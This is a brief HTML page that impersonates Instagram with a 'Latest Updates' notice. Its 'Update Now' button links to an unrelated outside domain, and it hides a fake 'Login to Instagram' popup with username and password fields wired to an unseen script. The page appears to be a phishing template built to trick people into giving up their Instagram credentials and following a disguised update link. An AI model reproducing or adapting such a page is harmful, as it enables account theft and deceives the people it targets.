<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Updates</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="container">
        <img src="instagram-logo.png" alt="Instagram Logo" class="logo">
        <h1>Instagram Latest Updates</h1>
        <p>Stay updated with the newest features and improvements!</p>

        <div id="updates">
            <!-- Updates will be dynamically loaded here -->
        </div>

        <a href="https://ignite.lk/?f=MzQmYW1wO2k9MjU2MjU5"><button id="">Update Now</button></a>
        <p class="small-text">Get it on Google Play & App Store</p>
    </div>

    <!-- Instagram Login Popup -->
    <div id="loginPopup" class="popup">
        <div class="popup-content">
            <span class="close">&times;</span>
            <img src="instagram-logo.png" alt="Instagram Logo" class="popup-logo">
            <h2>Login to Instagram</h2>
            <input type="text" id="username" placeholder="Username or Email">
            <input type="password" id="password" placeholder="Password">
            <button id="loginBtn">Log In</button>
            <p class="forgot">Forgot password?</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
